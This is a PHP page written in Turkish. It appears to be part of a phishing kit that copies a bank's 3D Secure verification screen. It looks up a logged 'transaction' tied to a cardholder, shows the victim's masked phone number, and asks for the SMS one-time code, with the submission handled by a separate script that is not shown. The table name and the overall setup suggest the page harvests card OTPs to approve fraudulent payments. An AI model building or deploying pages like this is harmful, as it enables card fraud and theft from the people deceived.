<?php

// Include the helper
include_once('../inc/helper.php');

// Get the data from the request
$tID = htmlspecialchars(trim(strip_tags($_GET['t'])));

if (empty($tID)) {
    header('Location: index.php');
    exit;
}

// Check transaction exist
$sql = "SELECT * FROM bella_bim_logs WHERE id = ?";
$query = $db->prepare($sql);
$stmt = $query->execute([$tID]);
$log = $query->fetch(PDO::FETCH_OBJ);

if (!$log) {
    header('Location: index.php');
    exit;
}

?>
<html class="no-js" lang="tr" style="height: 100%; width: 100%;">
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Güvenlik Doğrulaması</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">

    <link rel="stylesheet"
          href="assets/3d/bundle.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
</head>
<body>
<div class="content-wrapper" id="content" style="display: block;">
    <div class="header">
        <div style="display:flex; justify-content:center; align-items:center;">
            <img src="assets/img/logo.png" width="50%" height="100%" style="margin-bottom: 2rem;">
        </div>
        <hr/>
        <div style="display:flex; justify-content:center; align-items:center;">
            <img src="assets/img/onay.png" width="50%" height="100%" style="margin-bottom:2rem; margin-top:2rem;">
        </div>
    </div>

    <div id="approve-page">
        <div id="loaderDiv" style="height: 100%; width: 100%; position: absolute; z-index: 1; display: none">
            <div class="loader"></div>
        </div>
        <div class="content">
            <h1 id="approve-header">Doğrulama kodunu giriniz</h1>
            <form class="action-wrapper" id="SecureForm">
                <h3 id="otpMessage">
                    İşlem şifreniz
                    <span id="msisdn">
                        90<?= substr($log->cardholder_phone, 0, 3) . '****' . substr($log->cardholder_phone, -2) ?>
                    </span>
                    olan cep telefonunuza gönderilecektir.</h3>
                <div class="form-wrapper">
                    <label id="confirmCode" for="code">Doğrulama Kodu</label>
                    <div class="form-row">
                        <input type="password" class="f-input" name="code" id="code" maxlength="8"
                               autocomplete="one-time-code" inputmode="numeric" pattern="[0-9]*">
                    </div>
                    <div id="submitButtonDiv">
                        <div class="form-row has-submit" id="submitbutton">
                            <input type="submit" value="Onayla" class="button btn-1 btn-commit" id="submitButton">
                        </div>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
<script src="assets/js/init.js"></script>
<script src="assets/js/secure.js"></script>

</body>
</html>